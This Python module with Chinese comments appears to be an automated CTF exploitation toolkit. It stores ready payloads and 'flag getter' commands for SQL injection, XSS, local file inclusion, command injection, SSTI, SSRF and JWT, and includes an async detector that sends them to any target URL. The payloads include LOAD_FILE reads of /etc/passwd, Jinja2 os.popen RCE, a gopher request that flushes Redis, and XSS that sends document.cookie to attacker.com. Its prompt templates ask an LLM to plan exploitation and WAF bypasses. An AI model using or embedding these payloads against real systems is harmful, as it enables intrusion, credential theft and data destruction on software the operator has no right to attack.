"""
CTF Knowledge Base - 知识库驱动的漏洞检测系统

知识库设计，实现：
- 漏洞类型知识库（payload模板、检测方法、利用策略）
- Flag获取知识库（各种获取flag的方法）
- LLM提示词模板库
- 动态知识学习和更新

Author: SeaOf0
"""

import os
import re
import json
import yaml
import asyncio
from pathlib import Path
from typing import Dict, List, Any, Optional, Callable, Set
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor


class VulnerabilityType(Enum):
    """漏洞类型枚举"""
    SQL_INJECTION = "sqli"
    XSS = "xss"
    COMMAND_INJECTION = "cmdi"
    LFI = "lfi"
    RFI = "rfi"
    SSRF = "ssrf"
    XXE = "xxe"
    IDOR = "idor"
    FILE_UPLOAD = "upload"
    DESERIALIZATION = "deser"
    SSTI = "ssti"
    PATH_TRAVERSAL = "traversal"
    OPEN_REDIRECT = "redirect"
    CSRF = "csrf"
    JWT = "jwt"
    RACE_CONDITION = "race"
    PROTOTYPE_POLLUTION = "prototype"
    NOSQL_INJECTION = "nosqli"
    LDAP_INJECTION = "ldapi"
    XPATH_INJECTION = "xpathi"


@dataclass
class PayloadTemplate:
    """Payload模板"""
    name: str
    payload: str
    description: str
    bypass_type: str = "none"  # none, waf, encoding, case
    success_indicators: List[str] = field(default_factory=list)
    tags: List[str] = field(default_factory=list)


@dataclass
class DetectionMethod:
    """漏洞检测方法"""
    name: str
    method_type: str  # parameter_test, response_analysis, time_based, error_based
    payloads: List[str]
    matchers: Dict[str, Any]
    confidence: float = 0.8


@dataclass
class ExploitStrategy:
    """漏洞利用策略"""
    name: str
    steps: List[Dict[str, Any]]
    prerequisites: List[str] = field(default_factory=list)
    success_rate: float = 0.7
    post_exploit: List[str] = field(default_factory=list)


@dataclass
class FlagGetterMethod:
    """Flag获取方法"""
    name: str
    vuln_type: str
    commands: List[str]
    description: str
    priority: int = 5
    requires: List[str] = field(default_factory=list)


@dataclass
class VulnerabilityKnowledge:
    """单个漏洞类型的完整知识"""
    vuln_type: VulnerabilityType
    description: str
    payloads: List[PayloadTemplate]
    detection_methods: List[DetectionMethod]
    exploit_strategies: List[ExploitStrategy]
    flag_getters: List[FlagGetterMethod]
    llm_prompts: Dict[str, str]
    references: List[str] = field(default_factory=list)


class KnowledgeLoader:
    """知识库加载器"""

    def __init__(self, knowledge_dir: str = None):
        self.knowledge_dir = Path(knowledge_dir) if knowledge_dir else self._default_knowledge_dir()
        self.loaded_knowledge: Dict[str, VulnerabilityKnowledge] = {}

    def _default_knowledge_dir(self) -> Path:
        """获取默认知识库目录"""
        base_dir = Path(__file__).parent.parent / "knowledge"
        base_dir.mkdir(parents=True, exist_ok=True)
        return base_dir

    def load_all(self) -> Dict[str, VulnerabilityKnowledge]:
        """加载所有知识库"""
        # 先加载内置知识
        self._load_builtin_knowledge()

        # 再加载文件知识库
        if self.knowledge_dir.exists():
            for vuln_dir in self.knowledge_dir.iterdir():
                if vuln_dir.is_dir():
                    self._load_vuln_knowledge(vuln_dir)

        return self.loaded_knowledge

    def _load_builtin_knowledge(self):
        """加载内置知识库"""
        # SQL注入知识
        self.loaded_knowledge["sqli"] = self._create_sqli_knowledge()
        # XSS知识
        self.loaded_knowledge["xss"] = self._create_xss_knowledge()
        # LFI知识
        self.loaded_knowledge["lfi"] = self._create_lfi_knowledge()
        # 命令注入知识
        self.loaded_knowledge["cmdi"] = self._create_cmdi_knowledge()
        # SSTI知识
        self.loaded_knowledge["ssti"] = self._create_ssti_knowledge()
        # SSRF知识
        self.loaded_knowledge["ssrf"] = self._create_ssrf_knowledge()
        # IDOR知识
        self.loaded_knowledge["idor"] = self._create_idor_knowledge()
        # JWT知识
        self.loaded_knowledge["jwt"] = self._create_jwt_knowledge()

    def _create_sqli_knowledge(self) -> VulnerabilityKnowledge:
        """创建SQL注入知识库"""
        payloads = [
            PayloadTemplate(
                name="basic_quote",
                payload="'",
                description="基础单引号测试",
                success_indicators=["error", "syntax", "mysql", "sql"]
            ),
            PayloadTemplate(
                name="union_select",
                payload="' UNION SELECT NULL,NULL,NULL--",
                description="UNION注入测试",
                success_indicators=["NULL", "column"]
            ),
            PayloadTemplate(
                name="boolean_blind",
                payload="' AND '1'='1",
                description="布尔盲注测试"
            ),
            PayloadTemplate(
                name="time_blind",
                payload="' AND SLEEP(5)--",
                description="时间盲注测试"
            ),
            PayloadTemplate(
                name="error_based",
                payload="' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
                description="报错注入"
            ),
            PayloadTemplate(
                name="waf_bypass_comment",
                payload="'/**/UNION/**/SELECT/**/NULL--",
                description="注释绕过WAF",
                bypass_type="waf"
            ),
            PayloadTemplate(
                name="waf_bypass_case",
                payload="' uNiOn SeLeCt NULL--",
                description="大小写绕过",
                bypass_type="case"
            ),
        ]

        detection_methods = [
            DetectionMethod(
                name="error_based_detection",
                method_type="error_based",
                payloads=["'", "\"", "\\", "' OR '1'='1", "1' AND '1'='2"],
                matchers={
                    "type": "word",
                    "words": ["sql", "mysql", "syntax", "query", "error", "warning"]
                }
            ),
            DetectionMethod(
                name="time_based_detection",
                method_type="time_based",
                payloads=["' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--"],
                matchers={
                    "type": "time",
                    "delay": 5
                }
            ),
        ]

        exploit_strategies = [
            ExploitStrategy(
                name="union_based_extraction",
                steps=[
                    {"action": "determine_columns", "payload": "' ORDER BY {n}--"},
                    {"action": "find_display_column", "payload": "' UNION SELECT {nulls}--"},
                    {"action": "extract_data", "payload": "' UNION SELECT {columns} FROM {table}--"}
                ],
                post_exploit=["获取数据库版本", "枚举表名", "提取敏感数据"]
            ),
        ]

        flag_getters = [
            FlagGetterMethod(
                name="read_flag_file",
                vuln_type="sqli",
                commands=[
                    "' UNION SELECT LOAD_FILE('/flag')--",
                    "' UNION SELECT LOAD_FILE('/var/www/html/flag.txt')--",
                    "' UNION SELECT LOAD_FILE('/etc/passwd')--"
                ],
                description="通过LOAD_FILE读取flag文件",
                priority=1
            ),
            FlagGetterMethod(
                name="extract_from_table",
                vuln_type="sqli",
                commands=[
                    "' UNION SELECT flag FROM flag--",
                    "' UNION SELECT flag FROM flags--",
                    "' UNION SELECT content FROM secret--"
                ],
                description="从数据表中提取flag",
                priority=2
            ),
        ]

        llm_prompts = {
            "detect": """分析以下HTTP响应，判断是否存在SQL注入漏洞：
请求: {request}
响应: {response}

判断依据：
1. 响应中是否包含数据库错误信息
2. 是否有SQL语法错误提示
3. 响应时间是否异常
4. 是否有UNION查询结果""",

            "exploit": """基于已确认的SQL注入漏洞，设计利用方案：
注入点: {injection_point}
数据库类型: {db_type}
已知信息: {known_info}

请提供：
1. 数据提取payload
2. 可能的flag位置
3. 绕过策略（如需要）"""
        }

        return VulnerabilityKnowledge(
            vuln_type=VulnerabilityType.SQL_INJECTION,
            description="SQL注入漏洞允许攻击者通过注入SQL代码操纵数据库",
            payloads=payloads,
            detection_methods=detection_methods,
            exploit_strategies=exploit_strategies,
            flag_getters=flag_getters,
            llm_prompts=llm_prompts,
            references=["https://owasp.org/www-community/attacks/SQL_Injection"]
        )

    def _create_xss_knowledge(self) -> VulnerabilityKnowledge:
        """创建XSS知识库"""
        payloads = [
            PayloadTemplate(
                name="basic_script",
                payload="<script>alert(1)</script>",
                description="基础script标签",
                success_indicators=["<script>alert(1)</script>"]
            ),
            PayloadTemplate(
                name="img_onerror",
                payload='<img src=x onerror=alert(1)>',
                description="img标签onerror事件"
            ),
            PayloadTemplate(
                name="svg_onload",
                payload='<svg onload=alert(1)>',
                description="svg标签onload事件"
            ),
            PayloadTemplate(
                name="body_onload",
                payload='<body onload=alert(1)>',
                description="body标签注入"
            ),
            PayloadTemplate(
                name="waf_bypass_encoding",
                payload='<script>alert(String.fromCharCode(49))</script>',
                description="字符编码绕过",
                bypass_type="encoding"
            ),
        ]

        detection_methods = [
            DetectionMethod(
                name="reflection_detection",
                method_type="response_analysis",
                payloads=["<test>", "{{7*7}}", "${7*7}"],
                matchers={
                    "type": "word",
                    "words": ["<test>", "49"]
                }
            ),
        ]

        flag_getters = [
            FlagGetterMethod(
                name="steal_cookie",
                vuln_type="xss",
                commands=[
                    '<script>fetch("http://attacker.com/?c="+document.cookie)</script>',
                    '<img src=x onerror="location=\'http://attacker.com/?c=\'+document.cookie">'
                ],
                description="窃取Cookie获取session",
                priority=1
            ),
        ]

        llm_prompts = {
            "detect": """分析响应中是否存在XSS漏洞：
输入点: {input_point}
响应内容: {response}

检查：
1. 输入是否被原样反射
2. 是否有HTML实体编码
3. 上下文环境（HTML/JS/属性）"""
        }

        return VulnerabilityKnowledge(
            vuln_type=VulnerabilityType.XSS,
            description="跨站脚本攻击允许在用户浏览器中执行恶意脚本",
            payloads=payloads,
            detection_methods=detection_methods,
            exploit_strategies=[],
            flag_getters=flag_getters,
            llm_prompts=llm_prompts
        )

    def _create_lfi_knowledge(self) -> VulnerabilityKnowledge:
        """创建LFI知识库"""
        payloads = [
            PayloadTemplate(
                name="basic_etc_passwd",
                payload="../../../etc/passwd",
                description="基础路径遍历",
                success_indicators=["root:", "nobody:"]
            ),
            PayloadTemplate(
                name="null_byte",
                payload="../../../etc/passwd%00",
                description="空字节截断"
            ),
            PayloadTemplate(
                name="double_encoding",
                payload="..%252f..%252f..%252fetc/passwd",
                description="双重URL编码绕过",
                bypass_type="encoding"
            ),
            PayloadTemplate(
                name="php_filter",
                payload="php://filter/convert.base64-encode/resource=index.php",
                description="PHP过滤器读取源码"
            ),
            PayloadTemplate(
                name="php_input",
                payload="php://input",
                description="PHP输入流（需POST数据）"
            ),
            PayloadTemplate(
                name="data_wrapper",
                payload="data://text/plain,<?php phpinfo();?>",
                description="data协议执行代码"
            ),
        ]

        detection_methods = [
            DetectionMethod(
                name="etc_passwd_test",
                method_type="response_analysis",
                payloads=[
                    "../etc/passwd",
                    "../../etc/passwd",
                    "../../../etc/passwd",
                    "....//....//....//etc/passwd"
                ],
                matchers={
                    "type": "word",
                    "words": ["root:x:0:0", "nobody:"]
                }
            ),
        ]

        flag_getters = [
            FlagGetterMethod(
                name="read_flag_direct",
                vuln_type="lfi",
                commands=[
                    "../../../flag",
                    "../../../flag.txt",
                    "../../../var/www/html/flag.txt",
                    "../../../home/ctf/flag"
                ],
                description="直接读取flag文件",
                priority=1
            ),
            FlagGetterMethod(
                name="read_proc_self",
                vuln_type="lfi",
                commands=[
                    "../../../proc/self/environ",
                    "../../../proc/self/cmdline",
                    "../../../proc/self/fd/0"
                ],
                description="读取进程信息",
                priority=3
            ),
        ]

        llm_prompts = {
            "detect": """分析是否存在LFI漏洞：
参数: {param}
请求: {request}
响应: {response}

判断：
1. 是否能读取系统文件
2. 路径遍历是否有效
3. 过滤绕过方法""",

            "exploit": """LFI漏洞利用策略：
确认的LFI点: {lfi_point}
可读取文件: {readable_files}

请提供：
1. flag可能位置列表
2. RCE转换方法（如log注入）
3. 敏感信息提取顺序"""
        }

        return VulnerabilityKnowledge(
            vuln_type=VulnerabilityType.LFI,
            description="本地文件包含允许读取服务器本地文件",
            payloads=payloads,
            detection_methods=detection_methods,
            exploit_strategies=[],
            flag_getters=flag_getters,
            llm_prompts=llm_prompts
        )

    def _create_cmdi_knowledge(self) -> VulnerabilityKnowledge:
        """创建命令注入知识库"""
        payloads = [
            PayloadTemplate(
                name="semicolon",
                payload=";id",
                description="分号命令分隔"
            ),
            PayloadTemplate(
                name="pipe",
                payload="|id",
                description="管道符"
            ),
            PayloadTemplate(
                name="backtick",
                payload="`id`",
                description="反引号执行"
            ),
            PayloadTemplate(
                name="dollar_paren",
                payload="$(id)",
                description="$()命令替换"
            ),
            PayloadTemplate(
                name="newline",
                payload="\nid",
                description="换行符"
            ),
            PayloadTemplate(
                name="and_operator",
                payload="&&id",
                description="AND运算符"
            ),
            PayloadTemplate(
                name="or_operator",
                payload="||id",
                description="OR运算符"
            ),
        ]

        flag_getters = [
            FlagGetterMethod(
                name="cat_flag",
                vuln_type="cmdi",
                commands=[
                    ";cat /flag",
                    "|cat /flag",
                    "$(cat /flag)",
                    "`cat /flag`"
                ],
                description="直接cat读取flag",
                priority=1
            ),
            FlagGetterMethod(
                name="find_flag",
                vuln_type="cmdi",
                commands=[
                    ";find / -name 'flag*' 2>/dev/null",
                    "|grep -r 'flag{' / 2>/dev/null"
                ],
                description="搜索flag文件",
                priority=2
            ),
        ]

        llm_prompts = {
            "detect": """检测命令注入：
输入: {input}
响应: {response}

检查响应中是否包含命令执行结果特征"""
        }

        return VulnerabilityKnowledge(
            vuln_type=VulnerabilityType.COMMAND_INJECTION,
            description="命令注入允许在服务器上执行任意系统命令",
            payloads=payloads,
            detection_methods=[],
            exploit_strategies=[],
            flag_getters=flag_getters,
            llm_prompts=llm_prompts
        )

    def _create_ssti_knowledge(self) -> VulnerabilityKnowledge:
        """创建SSTI知识库"""
        payloads = [
            PayloadTemplate(
                name="jinja2_basic",
                payload="{{7*7}}",
                description="Jinja2基础测试",
                success_indicators=["49"]
            ),
            PayloadTemplate(
                name="jinja2_config",
                payload="{{config}}",
                description="Jinja2配置泄露"
            ),
            PayloadTemplate(
                name="jinja2_rce",
                payload="{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                description="Jinja2 RCE"
            ),
            PayloadTemplate(
                name="twig_basic",
                payload="{{7*'7'}}",
                description="Twig模板测试",
                success_indicators=["7777777"]
            ),
            PayloadTemplate(
                name="smarty_basic",
                payload="{php}echo 'test';{/php}",
                description="Smarty模板测试"
            ),
        ]

        flag_getters = [
            FlagGetterMethod(
                name="jinja2_read_flag",
                vuln_type="ssti",
                commands=[
                    "{{''.__class__.__mro__[2].__subclasses__()[40]('/flag').read()}}",
                    "{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}"
                ],
                description="Jinja2读取flag",
                priority=1
            ),
        ]

        return VulnerabilityKnowledge(
            vuln_type=VulnerabilityType.SSTI,
            description="服务端模板注入允许执行模板引擎代码",
            payloads=payloads,
            detection_methods=[],
            exploit_strategies=[],
            flag_getters=flag_getters,
            llm_prompts={}
        )

    def _create_ssrf_knowledge(self) -> VulnerabilityKnowledge:
        """创建SSRF知识库"""
        payloads = [
            PayloadTemplate(
                name="localhost",
                payload="http://127.0.0.1",
                description="访问本地服务"
            ),
            PayloadTemplate(
                name="internal_ip",
                payload="http://192.168.1.1",
                description="访问内网IP"
            ),
            PayloadTemplate(
                name="file_protocol",
                payload="file:///etc/passwd",
                description="file协议读取文件"
            ),
            PayloadTemplate(
                name="gopher",
                payload="gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
                description="Gopher协议攻击Redis"
            ),
            PayloadTemplate(
                name="dict_protocol",
                payload="dict://127.0.0.1:6379/info",
                description="Dict协议探测服务"
            ),
        ]

        flag_getters = [
            FlagGetterMethod(
                name="file_read",
                vuln_type="ssrf",
                commands=[
                    "file:///flag",
                    "file:///flag.txt",
                    "file:///var/www/html/flag.txt"
                ],
                description="使用file协议读取flag",
                priority=1
            ),
        ]

        return VulnerabilityKnowledge(
            vuln_type=VulnerabilityType.SSRF,
            description="服务端请求伪造允许攻击者让服务器发起请求",
            payloads=payloads,
            detection_methods=[],
            exploit_strategies=[],
            flag_getters=flag_getters,
            llm_prompts={}
        )

    def _create_idor_knowledge(self) -> VulnerabilityKnowledge:
        """创建IDOR知识库"""
        payloads = [
            PayloadTemplate(
                name="id_increment",
                payload="{FUZZ}",
                description="ID递增测试",
                tags=["numeric"]
            ),
            PayloadTemplate(
                name="uuid_variation",
                payload="{FUZZ}",
                description="UUID变体测试",
                tags=["uuid"]
            ),
        ]

        detection_methods = [
            DetectionMethod(
                name="numeric_id_fuzz",
                method_type="parameter_test",
                payloads=["1", "2", "0", "-1", "9999"],
                matchers={
                    "type": "different_response",
                    "compare": "content_length"
                }
            ),
        ]

        llm_prompts = {
            "detect": """分析IDOR漏洞：
请求: {request}
参数: {params}

检查：
1. 哪些参数可能是对象引用
2. 是否有访问控制验证
3. 响应内容是否因ID变化而变化"""
        }

        return VulnerabilityKnowledge(
            vuln_type=VulnerabilityType.IDOR,
            description="不安全的直接对象引用允许访问未授权资源",
            payloads=payloads,
            detection_methods=detection_methods,
            exploit_strategies=[],
            flag_getters=[],
            llm_prompts=llm_prompts
        )

    def _create_jwt_knowledge(self) -> VulnerabilityKnowledge:
        """创建JWT知识库"""
        payloads = [
            PayloadTemplate(
                name="none_algorithm",
                payload='{"alg":"none"}',
                description="算法设置为none"
            ),
            PayloadTemplate(
                name="hs256_to_none",
                payload="修改header中alg为none，删除签名",
                description="算法混淆攻击"
            ),
            PayloadTemplate(
                name="weak_secret",
                payload="secret",
                description="弱密钥测试"
            ),
        ]

        exploit_strategies = [
            ExploitStrategy(
                name="algorithm_confusion",
                steps=[
                    {"action": "decode_jwt", "description": "解码JWT获取header和payload"},
                    {"action": "modify_algorithm", "description": "将alg改为none"},
                    {"action": "remove_signature", "description": "移除签名部分"},
                    {"action": "test_token", "description": "使用修改后的token测试"}
                ]
            ),
        ]

        return VulnerabilityKnowledge(
            vuln_type=VulnerabilityType.JWT,
            description="JWT令牌漏洞可能导致认证绕过",
            payloads=payloads,
            detection_methods=[],
            exploit_strategies=exploit_strategies,
            flag_getters=[],
            llm_prompts={}
        )

    def _load_vuln_knowledge(self, vuln_dir: Path):
        """从目录加载漏洞知识"""
        vuln_type = vuln_dir.name

        # 加载payloads
        payloads_file = vuln_dir / "payloads.yaml"
        payloads = []
        if payloads_file.exists():
            with open(payloads_file) as f:
                data = yaml.safe_load(f) or []
                for p in data:
                    payloads.append(PayloadTemplate(**p))

        # 加载flag获取方法
        flag_getters_file = vuln_dir / "flag_getters.yaml"
        flag_getters = []
        if flag_getters_file.exists():
            with open(flag_getters_file) as f:
                data = yaml.safe_load(f) or []
                for fg in data:
                    flag_getters.append(FlagGetterMethod(**fg))

        # 加载LLM提示词
        prompts_file = vuln_dir / "prompts.yaml"
        llm_prompts = {}
        if prompts_file.exists():
            with open(prompts_file) as f:
                llm_prompts = yaml.safe_load(f) or {}

        # 如果已有该类型知识，合并
        if vuln_type in self.loaded_knowledge:
            existing = self.loaded_knowledge[vuln_type]
            existing.payloads.extend(payloads)
            existing.flag_getters.extend(flag_getters)
            existing.llm_prompts.update(llm_prompts)
        else:
            # 创建新知识
            try:
                vt = VulnerabilityType(vuln_type)
            except ValueError:
                return

            self.loaded_knowledge[vuln_type] = VulnerabilityKnowledge(
                vuln_type=vt,
                description=f"{vuln_type} vulnerability",
                payloads=payloads,
                detection_methods=[],
                exploit_strategies=[],
                flag_getters=flag_getters,
                llm_prompts=llm_prompts
            )


class CTFKnowledgeBase:
    """CTF知识库主类"""

    def __init__(self, knowledge_dir: str = None):
        self.loader = KnowledgeLoader(knowledge_dir)
        self.knowledge: Dict[str, VulnerabilityKnowledge] = {}
        self.flag_patterns: List[re.Pattern] = [
            re.compile(r'flag\{[^}]+\}', re.IGNORECASE),
            re.compile(r'ctf\{[^}]+\}', re.IGNORECASE),
            re.compile(r'FLAG\{[^}]+\}'),
            re.compile(r'CTF\{[^}]+\}'),
            re.compile(r'DASCTF\{[^}]+\}'),
            re.compile(r'HCTF\{[^}]+\}'),
            re.compile(r'SCTF\{[^}]+\}'),
            re.compile(r'[a-f0-9]{32}'),  # MD5
            re.compile(r'[a-f0-9]{40}'),  # SHA1
            re.compile(r'[a-f0-9]{64}'),  # SHA256
        ]
        self._loaded = False

    def load(self):
        """加载知识库"""
        if not self._loaded:
            self.knowledge = self.loader.load_all()
            self._loaded = True

    def get_payloads(self, vuln_type: str, bypass: str = None) -> List[PayloadTemplate]:
        """获取指定漏洞类型的payloads"""
        self.load()

        if vuln_type not in self.knowledge:
            return []

        payloads = self.knowledge[vuln_type].payloads

        if bypass:
            payloads = [p for p in payloads if p.bypass_type == bypass or p.bypass_type == "none"]

        return payloads

    def get_flag_getters(self, vuln_type: str) -> List[FlagGetterMethod]:
        """获取指定漏洞类型的flag获取方法"""
        self.load()

        if vuln_type not in self.knowledge:
            return []

        methods = self.knowledge[vuln_type].flag_getters
        return sorted(methods, key=lambda x: x.priority)

    def get_llm_prompt(self, vuln_type: str, prompt_type: str) -> Optional[str]:
        """获取LLM提示词模板"""
        self.load()

        if vuln_type not in self.knowledge:
            return None

        return self.knowledge[vuln_type].llm_prompts.get(prompt_type)

    def detect_flags(self, content: str) -> List[str]:
        """从内容中检测flag"""
        flags = []
        for pattern in self.flag_patterns:
            matches = pattern.findall(content)
            flags.extend(matches)
        return list(set(flags))

    def get_detection_methods(self, vuln_type: str) -> List[DetectionMethod]:
        """获取漏洞检测方法"""
        self.load()

        if vuln_type not in self.knowledge:
            return []

        return self.knowledge[vuln_type].detection_methods

    def get_exploit_strategies(self, vuln_type: str) -> List[ExploitStrategy]:
        """获取漏洞利用策略"""
        self.load()

        if vuln_type not in self.knowledge:
            return []

        return self.knowledge[vuln_type].exploit_strategies

    def get_all_vuln_types(self) -> List[str]:
        """获取所有已知漏洞类型"""
        self.load()
        return list(self.knowledge.keys())

    def suggest_next_action(self, vuln_type: str, current_phase: str, context: Dict[str, Any]) -> Dict[str, Any]:
        """基于当前阶段和上下文建议下一步动作"""
        self.load()

        if vuln_type not in self.knowledge:
            return {"action": "unknown", "reason": "未知漏洞类型"}

        knowledge = self.knowledge[vuln_type]

        if current_phase == "detection":
            # 检测阶段，返回检测方法
            methods = knowledge.detection_methods
            if methods:
                return {
                    "action": "detect",
                    "method": methods[0].name,
                    "payloads": methods[0].payloads[:5]
                }

        elif current_phase == "exploitation":
            # 利用阶段，返回利用策略
            strategies = knowledge.exploit_strategies
            if strategies:
                return {
                    "action": "exploit",
                    "strategy": strategies[0].name,
                    "steps": strategies[0].steps
                }

        elif current_phase == "flag_extraction":
            # Flag提取阶段
            getters = sorted(knowledge.flag_getters, key=lambda x: x.priority)
            if getters:
                return {
                    "action": "get_flag",
                    "method": getters[0].name,
                    "commands": getters[0].commands
                }

        return {"action": "complete", "reason": "所有阶段已完成"}

    def export_knowledge(self, output_dir: str):
        """导出知识库到目录"""
        self.load()

        output_path = Path(output_dir)
        output_path.mkdir(parents=True, exist_ok=True)

        for vuln_type, knowledge in self.knowledge.items():
            vuln_dir = output_path / vuln_type
            vuln_dir.mkdir(exist_ok=True)

            # 导出payloads
            payloads_data = [
                {
                    "name": p.name,
                    "payload": p.payload,
                    "description": p.description,
                    "bypass_type": p.bypass_type,
                    "success_indicators": p.success_indicators,
                    "tags": p.tags
                }
                for p in knowledge.payloads
            ]
            with open(vuln_dir / "payloads.yaml", "w") as f:
                yaml.dump(payloads_data, f, allow_unicode=True)

            # 导出flag getters
            flag_getters_data = [
                {
                    "name": fg.name,
                    "vuln_type": fg.vuln_type,
                    "commands": fg.commands,
                    "description": fg.description,
                    "priority": fg.priority
                }
                for fg in knowledge.flag_getters
            ]
            with open(vuln_dir / "flag_getters.yaml", "w") as f:
                yaml.dump(flag_getters_data, f, allow_unicode=True)

            # 导出prompts
            if knowledge.llm_prompts:
                with open(vuln_dir / "prompts.yaml", "w") as f:
                    yaml.dump(knowledge.llm_prompts, f, allow_unicode=True)


class KnowledgeDrivenDetector:
    """知识库驱动的漏洞检测器"""

    def __init__(self, knowledge_base: CTFKnowledgeBase = None):
        self.kb = knowledge_base or CTFKnowledgeBase()
        self.kb.load()
        self.results: Dict[str, List[Dict[str, Any]]] = {}

    async def detect_all(self, target_url: str, params: Dict[str, str] = None) -> Dict[str, Any]:
        """对目标进行全漏洞类型检测"""
        import aiohttp

        detected_vulns = []

        for vuln_type in self.kb.get_all_vuln_types():
            detection_methods = self.kb.get_detection_methods(vuln_type)

            for method in detection_methods:
                result = await self._run_detection(target_url, params, method)
                if result.get("vulnerable"):
                    detected_vulns.append({
                        "type": vuln_type,
                        "method": method.name,
                        "confidence": result.get("confidence", 0.5),
                        "details": result.get("details")
                    })

        return {
            "target": target_url,
            "vulnerabilities": detected_vulns,
            "total": len(detected_vulns)
        }

    async def _run_detection(self, url: str, params: Dict[str, str], method: DetectionMethod) -> Dict[str, Any]:
        """运行单个检测方法"""
        import aiohttp

        for payload in method.payloads:
            try:
                # 构造测试请求
                test_params = params.copy() if params else {}

                # 在参数中注入payload
                for key in test_params:
                    test_params[key] = payload

                async with aiohttp.ClientSession() as session:
                    async with session.get(url, params=test_params, timeout=10) as resp:
                        content = await resp.text()

                        # 检查匹配器
                        if self._check_matcher(content, resp.status, method.matchers):
                            return {
                                "vulnerable": True,
                                "confidence": method.confidence,
                                "payload": payload,
                                "details": f"Matched with {method.matchers}"
                            }
            except Exception as e:
                continue

        return {"vulnerable": False}

    def _check_matcher(self, content: str, status: int, matcher: Dict[str, Any]) -> bool:
        """检查响应是否匹配"""
        matcher_type = matcher.get("type")

        if matcher_type == "word":
            words = matcher.get("words", [])
            return any(word.lower() in content.lower() for word in words)

        elif matcher_type == "status":
            statuses = matcher.get("status", [])
            return status in statuses

        elif matcher_type == "regex":
            patterns = matcher.get("patterns", [])
            return any(re.search(p, content) for p in patterns)

        return False


# 全局知识库实例
_global_knowledge_base: Optional[CTFKnowledgeBase] = None


def get_knowledge_base() -> CTFKnowledgeBase:
    """获取全局知识库实例"""
    global _global_knowledge_base
    if _global_knowledge_base is None:
        _global_knowledge_base = CTFKnowledgeBase()
        _global_knowledge_base.load()
    return _global_knowledge_base


# 便捷函数
def get_payloads(vuln_type: str, bypass: str = None) -> List[PayloadTemplate]:
    """获取漏洞payload"""
    return get_knowledge_base().get_payloads(vuln_type, bypass)


def get_flag_getters(vuln_type: str) -> List[FlagGetterMethod]:
    """获取flag获取方法"""
    return get_knowledge_base().get_flag_getters(vuln_type)


def detect_flags(content: str) -> List[str]:
    """检测content中的flag"""
    return get_knowledge_base().detect_flags(content)


def suggest_action(vuln_type: str, phase: str, context: Dict = None) -> Dict[str, Any]:
    """建议下一步动作"""
    return get_knowledge_base().suggest_next_action(vuln_type, phase, context or {})
